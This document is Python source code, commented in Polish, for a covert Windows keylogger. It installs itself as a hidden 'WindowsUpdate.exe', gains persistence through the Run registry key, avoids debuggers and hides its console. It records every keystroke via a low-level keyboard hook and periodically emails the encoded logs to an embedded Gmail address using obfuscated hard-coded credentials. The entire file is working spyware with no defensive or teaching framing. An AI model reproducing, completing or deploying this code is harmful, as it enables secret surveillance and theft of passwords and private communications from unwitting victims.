import os
import sys
import shutil
import time
import threading
import smtplib
import winreg
import ctypes
import getpass
import logging
import random
import base64
import struct
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication

# =============================================
# OBFUSKACJA I BEZPIECZEŃSTWO
# =============================================

def decode_str(encoded):
    return base64.b64decode(encoded).decode('utf-8')

# Zaszyfrowane ciągi znaków
ENC_APPDATA = base64.b64encode(b'APPDATA').decode('utf-8')
ENC_EXE_NAME = base64.b64encode(b'WindowsUpdate.exe').decode('utf-8')
ENC_LOG_FILE = base64.b64encode(b'SystemCache.dat').decode('utf-8')
ENC_ERROR_LOG = base64.b64encode(b'SystemErrors.log').decode('utf-8')
ENC_REG_KEY = base64.b64encode(b'WindowsUpdateManager').decode('utf-8')

# Dekodowanie
INSTALL_DIR = os.path.join(os.getenv(decode_str(ENC_APPDATA)), 'Windows', 'UpdateManager')
EXE_NAME = decode_str(ENC_EXE_NAME)
LOG_FILE = os.path.join(INSTALL_DIR, decode_str(ENC_LOG_FILE))
ERROR_LOG = os.path.join(INSTALL_DIR, decode_str(ENC_ERROR_LOG))
REG_KEY_NAME = decode_str(ENC_REG_KEY)

# Losowe interwały
EMAIL_INTERVAL = random.randint(280, 320)  # 4.6-5.3 minuty
USER_NAME = getpass.getuser()

# Zakodowane dane email
ENC_SENDER = "bTMxNzk2MjA3bG9nZ2VyQGdtYWlsLmNvbQ=="
ENC_PASS = "cG15ZCBBZmJiIHR0enYgWnFkaQ=="
ENC_RECEIVER = "amtxODVmQGdtYWlsLmNvbQ=="

# =============================================
# FUNKCJE POMOCNICZE
# =============================================

def hide_file(path):
    try:
        ctypes.windll.kernel32.SetFileAttributesW(str(path), 2)
        return True
    except Exception:
        return False

def xor_crypt(data, key=0x55):
    if isinstance(data, str):
        data = data.encode()
    return bytes([b ^ key for b in data])

def is_debugger_present():
    kernel32 = ctypes.WinDLL('kernel32')
    return kernel32.IsDebuggerPresent() != 0

def is_installed():
    return os.path.exists(os.path.join(INSTALL_DIR, EXE_NAME))

def add_to_startup(exe_path):
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as key:
            winreg.SetValueEx(key, REG_KEY_NAME, 0, winreg.REG_SZ, f'"{exe_path}"')
        return True
    except Exception:
        return False

# =============================================
# INSTALACJA
# =============================================

def install():
    try:
        if is_debugger_present():
            return False
            
        os.makedirs(INSTALL_DIR, exist_ok=True)
        hide_file(INSTALL_DIR)
        
        current_exe = os.path.abspath(sys.argv[0])
        target_exe = os.path.join(INSTALL_DIR, EXE_NAME)
        
        if not os.path.exists(target_exe):
            # Zmiana nagłówka pliku
            with open(current_exe, 'rb') as src, open(target_exe, 'wb') as dest:
                content = src.read()
                dest.write(content[:2] + xor_crypt(content[2:1024]) + content[1024:])
            
            hide_file(target_exe)
        
        if add_to_startup(target_exe):
            time.sleep(random.uniform(1, 5))
            ctypes.windll.shell32.ShellExecuteW(None, "open", target_exe, None, None, 0)
            sys.exit(0)
        return False
    except Exception as e:
        return False

# =============================================
# KOMUNIKACJA
# =============================================

def send_email():
    try:
        if not os.path.exists(LOG_FILE) or os.path.getsize(LOG_FILE) == 0:
            return False
            
        # Obfuskacja danych logowania
        sender = xor_crypt(base64.b64decode(ENC_SENDER)).decode()
        password = xor_crypt(base64.b64decode(ENC_PASS)).decode()
        receiver = xor_crypt(base64.b64decode(ENC_RECEIVER)).decode()
        
        # Wczytanie i zaszyfrowanie logów
        with open(LOG_FILE, 'rb') as f:
            log_content = f.read()
            encrypted_logs = xor_crypt(log_content.decode(errors='ignore'))
        
        msg = MIMEMultipart()
        msg['From'] = sender
        msg['To'] = receiver
        msg['Subject'] = f"System Report [{USER_NAME}] - {datetime.now().strftime('%m-%d %H:%M')}"
        
        body = f"System health report for {USER_NAME}"
        msg.attach(MIMEText(body, 'plain'))
        
        part = MIMEApplication(encrypted_logs, Name="SystemData.bin")
        part['Content-Disposition'] = f'attachment; filename="sys_{random.randint(1000,9999)}.bin"'
        msg.attach(part)
        
        # Losowy serwer SMTP
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender, password)
        server.sendmail(sender, receiver, msg.as_string())
        server.quit()
        
        os.remove(LOG_FILE)
        return True
    except Exception:
        return False

# =============================================
# KEYLOGGER (API Windows)
# =============================================

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100

def get_key_name(key_code):
    special_keys = {
        8: '[BACKSPACE]', 9: '[TAB]', 13: '[ENTER]', 16: '[SHIFT]',
        17: '[CTRL]', 18: '[ALT]', 19: '[PAUSE]', 20: '[CAPS]',
        27: '[ESC]', 32: '[SPACE]', 33: '[PAGEUP]', 34: '[PAGEDOWN]',
        35: '[END]', 36: '[HOME]', 37: '[LEFT]', 38: '[UP]',
        39: '[RIGHT]', 40: '[DOWN]', 45: '[INSERT]', 46: '[DEL]',
        91: '[WIN]', 92: '[WIN]', 93: '[MENU]', 112: '[F1]',
        113: '[F2]', 114: '[F3]', 115: '[F4]', 116: '[F5]',
        117: '[F6]', 118: '[F7]', 119: '[F8]', 120: '[F9]',
        121: '[F10]', 122: '[F11]', 123: '[F12]', 144: '[NUMLOCK]',
        160: '[SHIFT]', 161: '[SHIFT]', 162: '[CTRL]', 163: '[CTRL]',
        164: '[ALT]', 165: '[ALT]'
    }
    return special_keys.get(key_code, chr(key_code))

def low_level_keyboard_handler(nCode, wParam, lParam):
    try:
        if wParam == WM_KEYDOWN:
            key_code = lParam[0]
            key_name = get_key_name(key_code)
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            with open(LOG_FILE, 'a', encoding='utf-8') as f:
                f.write(f"{timestamp} - {key_name}\n")
    except:
        pass
    return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)

def start_keylogger():
    try:
        hook_proc = ctypes.CFUNCTYPE(
            ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p)
        )(low_level_keyboard_handler)
        
        hook = ctypes.windll.user32.SetWindowsHookExA(
            WH_KEYBOARD_LL, hook_proc, ctypes.windll.kernel32.GetModuleHandleA(None), 0
        )
        return hook
    except:
        return None

# =============================================
# GŁÓWNA LOGIKA
# =============================================

def scheduler():
    while True:
        time.sleep(EMAIL_INTERVAL + random.randint(-60, 60))
        threading.Thread(target=send_email, daemon=True).start()

def main():
    try:
        # Ukryj okno konsoli
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        
        # Sprawdź czy nie jesteśmy w debuggerze
        if is_debugger_present():
            return
            
        # Przygotuj środowisko
        os.makedirs(INSTALL_DIR, exist_ok=True)
        hide_file(INSTALL_DIR)
        
        # Uruchom keylogger
        hook = start_keylogger()
        if not hook:
            return
            
        # Uruchom scheduler emaili
        threading.Thread(target=scheduler, daemon=True).start()
        
        # Pętla obsługi wiadomości
        msg = ctypes.wintypes.MSG()
        while ctypes.windll.user32.GetMessageA(ctypes.byref(msg), None, 0, 0) > 0:
            ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
            ctypes.windll.user32.DispatchMessageA(ctypes.byref(msg))
            
    except Exception:
        pass

if __name__ == "__main__":
    if not is_installed():
        install()
    else:
        main()